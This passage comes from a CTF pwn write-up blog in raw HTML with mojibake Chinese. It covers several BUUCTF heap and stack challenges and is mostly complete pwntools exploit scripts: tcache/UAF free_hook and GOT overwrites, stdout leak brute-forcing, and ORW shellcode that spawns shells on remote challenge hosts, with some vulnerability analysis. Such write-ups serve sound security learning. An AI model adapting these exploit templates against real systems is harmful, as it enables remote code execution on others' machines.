class="hljs-string">'\x60\x87'</span>    add(<span class="hljs-number">0x190</span>,payload)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'\x60\x87'</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    payload = p64(<span class="hljs-number">0xfbad3c80</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x100</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./roarctf_2019_realloc_magic')</span>        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28690</span>)        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">4110208</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">4118760</span> + libc_basesys_addr = <span class="hljs-number">324832</span>+libc_basesla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'666'</span>)add(<span class="hljs-number">0x120</span>,<span class="hljs-string">'aaaaaaa'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">' '</span>)add(<span class="hljs-number">0x160</span>,<span class="hljs-string">' '</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'a'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free()add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x120</span>,<span class="hljs-string">'\x60\x87'</span>)payload = <span class="hljs-number">37</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(free_hook)add(<span class="hljs-number">0x260</span>,payload)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'a'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)one_rec = rce18[<span class="hljs-number">1</span>] +libc_baseadd(<span class="hljs-number">0x130</span>,p64(one_rec))free()<span class="hljs-comment"># debug()</span>itr()</code></pre></div><p>å…¶ä¸­expçš„çˆ†ç ´stdoutéƒ¨åˆ†ï¼Œå¯ä»¥å½“ä½œæ¨¡ç‰ˆä½¿ç”¨ï¼Œæ¥è‡ªpzhxbzå¤§ä½¬çš„ã€‚</p><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a><code>ciscn_2019_en_3</code></h2><h3 id="åˆ†æ-20"><a href="#åˆ†æ-20" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¸¸è§„å †é¢˜ï¼ŒUAFï¼Œdupæ‰“<code>free_hook_</code>ã€‚ä¸Šæ¥ç”¨<code>puts(&amp;s)</code>ï¼Œæ¥æ³„æ¼æ ˆä¸Šå­˜åœ¨çš„libcåœ°å€ã€‚</p><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_en_3'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29542</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'story'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x20</span><span class="hljs-number">-8</span>)sa(<span class="hljs-string">'name'</span>,payload)sa(<span class="hljs-string">'ID'</span>,<span class="hljs-string">'chumen77'</span>)ru(<span class="hljs-string">'chumen77'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x81237</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)add(<span class="hljs-number">0x50</span>,<span class="hljs-string">'aaaaaaaa'</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span>add(<span class="hljs-number">0x50</span>,p64(free_hook))add(<span class="hljs-number">0x50</span>,p64(free_hook))rec = rce18[<span class="hljs-number">1</span>] + libc_baseadd(<span class="hljs-number">0x50</span>,p64(rec))free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="æå®¢å¤§æŒ‘æˆ˜2019-Not-bad"><a href="#æå®¢å¤§æŒ‘æˆ˜2019-Not-bad" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜2019 Not bad"></a>æå®¢å¤§æŒ‘æˆ˜2019 Not bad</h2><h3 id="åˆ†æ-21"><a href="#åˆ†æ-21" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æº¢å‡º0x18ä¸ªå­—èŠ‚ï¼ŒåŠ ä¸Šæœ¬èº«çš„æ ˆé•¿åº¦ï¼Œè¯»orw çš„shellcodeå†…å­˜ä¸æ˜¯å¾ˆå¤Ÿç”¨ã€‚éœ€è¦è¿ç§»åˆ°mmapï¼Œè¿›è¡Œorwã€‚æ‰€ä»¥æ‘†åœ¨æ ˆä¸Šçš„shellcodeå°±æ˜¯ï¼Œæ¥ä¸€ä¸ªreadå‡½æ•°ï¼ŒæŠŠorwæ”¾åœ¨mmapä¸Šï¼Œç„¶åå†è·³è½¬ä¸Šå»æ‰§è¡Œå³å¯ã€‚å¹¶ä¸”å†æ¬¡ç”¨åˆ° <code>jmp rsp</code> + shellcode.</p><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bad'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29794</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()mmap = <span class="hljs-number">0x123000</span>jmp_rsp = <span class="hljs-number">0x0000000000400a01</span><span class="hljs-comment"># bss = 0x6010B0 - 0x20</span>orw = asm(shellcraft.open(<span class="hljs-string">"./flag"</span>))orw += asm(shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-string">"rsp"</span>,<span class="hljs-number">0x30</span>))orw += asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">"rsp"</span>,<span class="hljs-number">0x30</span>))payload = asm(shellcraft.read(<span class="hljs-number">0</span>,mmap + <span class="hljs-number">0x300</span>,<span class="hljs-number">0x100</span>)) + asm(<span class="hljs-string">'mov rax,0x123300;call rax'</span>)payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">'a'</span>)payload += p64(jmp_rsp) +   asm(<span class="hljs-string">'sub rsp,0x30;jmp rsp'</span>)sa(<span class="hljs-string">'fun'</span>,payload)s(orw)itr()</code></pre></div><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a><code>ciscn_2019_final_5</code></h2><h3 id="åˆ†æ-22"><a href="#åˆ†æ-22" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><p>ä¿æŠ¤å¼€çš„ä¸å¤šï¼Œåˆ†æå’Œåˆ©ç”¨èµ·æ¥ç®€å•ä¸å°‘ã€‚</p><p>è¿™ä¸ªé¢˜éš¾ç‚¹å°±æ˜¯åœ¨äºå‘ç°æ¼æ´ç‚¹ã€‚</p><h4 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h4><div class="hljs"><pre><code class="hljs c">__int64 result; <span class="hljs-comment">// rax</span> <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span> <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span> <span class="hljs-keyword">int</span> idx; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span> <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"index: "</span>); idx = read_int(); <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">16</span> ) &#123;   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"index is invalid."</span>);   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); &#125; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"size: "</span>); size = read_int(); <span class="hljs-keyword">if</span> ( size &lt; <span class="hljs-number">0</span> || size &gt; <span class="hljs-number">0x1000</span> ) &#123;   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"size is invalid."</span>);   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); &#125; buf = <span class="hljs-built_in">malloc</span>(size); <span class="hljs-keyword">if</span> ( !buf ) &#123;   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"malloc error."</span>);   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); &#125; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"content: "</span>); read(<span class="hljs-number">0</span>, buf, size); show_diy((__int16)buf);</code></pre></div><p>å¯ä»¥è‡ªå®šä¹‰è¾“å…¥å †çš„ç¼–å·ï¼Œæœ€å¤§å¯ä»¥17ä¸ªï¼Œå°±æ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªã€‚ç„¶åä»¥æ ˆä¸Šçš„ä¸€ä¸ªbufæ¥å­˜å–åˆ†é…heapçš„åœ°å€ã€‚</p><div class="hljs"><pre><code class="hljs c">result = sub_400AB0((__int64)buf, idx);  v5 = result;  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">16</span>; ++i )  &#123;    result = heaplist_idx[i];    <span class="hljs-keyword">if</span> ( !result )    &#123;      heaplist_idx[i] = v5;      result = i;      sizelist[i] = size;      <span class="hljs-keyword">break</span>;    &#125;  &#125;</code></pre></div><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_400AB0</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2)</span></span>&#123;  <span class="hljs-keyword">return</span> a1 | a2;&#125;</code></pre></div><p>å¯ä»¥çœ‹åˆ°ä»¥å †åœ°å€ä¸å †çš„idè¿›è¡Œä»¥æ¥ä¸€ä¸ª<code>|</code> è¿ç®—ã€‚ç„¶åè¿”å›å›æ¥ç»™v5ï¼Œç„¶ååœ¨å­˜å…¥bssçš„ä¸€æ®µåœ°å€ä¸­ã€‚ç®—æ˜¯å¤„ç†è¿‡çš„å †åœ°å€ã€‚</p><p>å°è¯•ç ”ç©¶ä¸€ä¸‹ï¼Œåšå®Œå¤„ç†æ˜¯ä»€ä¹ˆæ ·å­ï¼š</p><p>å…ˆåˆ†é…ä¸€ä¸ªå †å·ä¸º1 å’Œ 16çš„å †å—ï¼Œçœ‹ä¸‹bssé‡Œé¢æ˜¯å­˜å…¥äº†ä»€ä¹ˆã€‚</p><div class="hljs"><pre><code class="hljs undefined">x/<span class="hljs-number">30</span>gx  <span class="hljs-number">0x6020E0</span><span class="hljs-number">0x6020e0</span>:       <span class="hljs-number">0x0000000000e35270</span>(<span class="hljs-number">16</span>)      <span class="hljs-number">0x0000000000e35281</span>(<span class="hljs-number">0</span>)</code></pre></div><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">2</span>]: hex(<span class="hljs-number">0x0e35260</span> | <span class="hljs-number">16</span>)Out[<span class="hljs-number">2</span>]: <span class="hljs-string">'0xe35270'</span>In [<span class="hljs-number">3</span>]: hex(<span class="hljs-number">0x00e35281</span> | <span class="hljs-number">0</span>)Out[<span class="hljs-number">3</span>]: <span class="hljs-string">'0xe35281'</span></code></pre></div><p>å·®ä¸å¤šå°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥å‘ç°ç‚¹å¼‚æ ·ã€‚å› ä¸ºæ˜¯<code>|</code> çš„é€»è¾‘è¿ç®—ï¼Œåœ¨<code>0-0xf</code>æ˜¯ä¸€ä¸ªè½®å›åï¼Œåˆ°äº†16å°±åˆç®—æ˜¯ä¸€ä¸ªè½®å›ã€‚<br>æ—¢ç„¶å¤„ç†è¿‡å †åœ°å€ï¼Œé‚£è‚¯å®šå–å‡ºæ¥è¿›è¡Œæ“ä½œæ—¶ï¼Œè‚¯å®šè¿˜ä¼šå†è¿›è¡Œå¤„ç†å›æ¥ã€‚ä¸‹é¢å°±æ˜¯æ³¨æ„æ€ä¹ˆå¤„ç†çš„ã€‚</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">16</span>; ++i ) &#123;   result = get_idx(heaplist_idx[i]);   <span class="hljs-keyword">if</span> ( result == idx )   &#123;     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"content: "</span>);     read_diy((<span class="hljs-keyword">void</span> *)(heaplist_idx[i] &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL), sizelist[i]);     result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">"edit success.\n"</span>);     <span class="hljs-keyword">break</span>;   &#125; &#125;</code></pre></div><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">get_idx</span><span class="hljs-params">(<span class="hljs-keyword">char</span> a1)</span></span>&#123;  <span class="hljs-keyword">return</span> a1 &amp; <span class="hljs-number">0xF</span>;&#125;</code></pre></div><p>å¯ä»¥çœ‹åˆ°å…¶æ˜¯ä¾æ¬¡0-17ç¼–å·å¯¹å †å—è¿›è¡Œéå†å–å‡ºï¼Œå†å–å‡ºæ—¶ä¼šå¯¹å…¶è¿›è¡Œ<code>&amp; 0xf</code>çš„æ“ä½œæ¥å°è¯•è·å–å †å—çš„ç¼–å·ã€‚</p><p>æ¥æµ‹è¯•ä¸€ä¸‹ï¼š</p><div class="hljs"><pre><code class="hljs c">In [5]: hex(0x00e35281 &amp; 0xf). #1å·å †å—çš„è®¡ç®—Out[5]: '0x1'In [6]: hex(0x00e35270 &amp; 0xf) #16å·å †å—çš„è®¡ç®—Out[6]: '0x0'</code></pre></div><p>è¿™å°±å¾ˆæ˜æ˜¾æœ‰å¼‚æ ·äº†ï¼Œç”³è¯·çš„æ˜¯16å·å †å—å…¶è®¤ä¸ºæ˜¯0å·å †å—ã€‚æ‰€ä»¥ç”³è¯·16å·çš„å †å—ï¼Œå…¶å¯ä»¥ç”¨editï¼ˆ0ï¼‰æ¥è¿›è¡Œç¼–è¾‘16å·å †å—ã€‚</p><p>ç„¶åçœ‹å…¶å¦‚ä½•ç¼–è¾‘çš„ï¼š</p><div class="hljs"><pre><code class="hljs c">read_diy((<span class="hljs-keyword">void</span> *)(heaplist_idx[i] &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL), sizelist[i]);</code></pre></div><p>å…¶æ˜¯æ ¹æ®bssä¸Šå­˜çš„å¤„ç†è¿‡å †å—åœ°å€è¿›è¡Œä¸€ä¸‹<code>&amp; 0xFFFFFFFFFFFFFFF0</code> æ¥è¿›è¡Œç¼–è¾‘çš„ã€‚<br>å¯¹äºä¸Šæ¥å°±ç”³è¯·äº†ä¸€ä¸ª16å·çš„å †å—ï¼Œå¾ˆå®¹æ˜“çŸ¥é“å…¶å †å—çš„æœ«3ä¸ºåº”è¯¥æ˜¯0x260ï¼Œä½†æ˜¯å½“æ—¶å­˜å…¥çš„æ˜¯0x270ï¼Œå°è¯•è¿›è¡Œä¸€ä¸‹<code>&amp; 0xFFFFFFFFFFFFFFF0</code>ï¼š</p><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">7</span>]: hex(<span class="hljs-number">0x00e35270</span> &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>)Out[<span class="hljs-number">7</span>]: <span class="hljs-string">'0xe35270'</span></code></pre></div><p>å‘ç°å¹¶ä¸æ˜¯ä»0x260è¿›è¡Œç¼–è¾‘ï¼Œä½†æ˜¯åŒæ ·è¿˜æ˜¯å¯ä»¥ç¼–è¾‘åŒæ ·çš„sizeï¼Œæ‰€ä»¥è¿™å°±é€ æˆäº†æº¢å‡ºï¼Œå¹¶ä¸”æ˜¯0x10ä¸ªå­—èŠ‚ã€‚</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>é‡Šæ”¾2ä¸ªtcache å †å—ï¼Œå¹¶ä¸”åˆ©ç”¨0x10å­—èŠ‚ï¼Œæ”¹å…¶ä¸­ä¸€ä¸ªå †å—çš„fdï¼Œæ”¹ä¸ºfreeçš„gotä½ç½®</li><li>ç”³è¯·å †å—åˆ°free gotå¤„ï¼Œæ”¹free ä¸º puts</li><li>æ„é€ å‡ºä¸€ä¸ªunsortbinçš„å †å—ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªå †å—ï¼Œå°±ä¼šåœ¨è¿™ä¸ªå †å—ä¸Šç•™ä¸‹éƒ¨åˆ†çš„libcåœ°å€ï¼Œç„¶åè¿›è¡Œleak</li><li>ç®—å‡ºsystemçš„åœ°å€ï¼Œç»§ç»­æ”¹free got å¤„ä¸º systemï¼Œç„¶åfreeä¸€ä¸ªå¸¦æœ‰<code>/bin/sh\x00</code>çš„å †å—ï¼Œå³å¯æ‹¿åˆ°shell</li></ul><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_5'</span>elf = ELF(local_file)<span class="hljs-comment"># context.log_level = 'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27180</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'content'</span>,str(data))add(<span class="hljs-number">16</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'sasdasdas'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x121</span>) + p64(<span class="hljs-number">0x000000000602010</span>))add(<span class="hljs-number">5</span>,<span class="hljs-number">0x800</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">'aaaa'</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">' '</span>)free(<span class="hljs-number">5</span>)add(<span class="hljs-number">7</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">' '</span>)add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span> + p64(elf.plt[<span class="hljs-string">'puts'</span>]))free(<span class="hljs-number">7</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ec120</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)edit(<span class="hljs-number">4</span>,<span class="hljs-string">'aaaaaaaa'</span> + p64(libc.sym[<span class="hljs-string">'system'</span>] + libc_base))add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span class="hljs-number">9</span>)itr()</code></pre></div><p>ç”±äºå…¶ç¡®å®šå †å—çš„ç‰¹æ®Šæ€§ï¼Œåœ¨ç”³è¯·å †å—åˆ°free gotæ—¶ï¼Œå› ä¸ºå…¶åœ¨<code>0x000000000602018</code>ï¼Œä½†æ˜¯åœ¨ç»è¿‡é€»è¾‘è¿ç®—å¤„ç†åï¼Œæ”¾å…¥bssåï¼Œæƒ³è¦å†è¿›è¡Œæ“ä½œå°±æœ‰ç‚¹å›°éš¾ï¼Œæ‰€ä»¥ç”³è¯·åˆ°<code>0x000000000602010</code> å°±OKäº†ã€‚</p><h2 id="ciscn-2019-s-1"><a href="#ciscn-2019-s-1" class="headerlink" title="ciscn_2019_s_1"></a><code>ciscn_2019_s_1</code></h2><h3 id="åˆ†æ-23"><a href="#åˆ†æ-23" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span 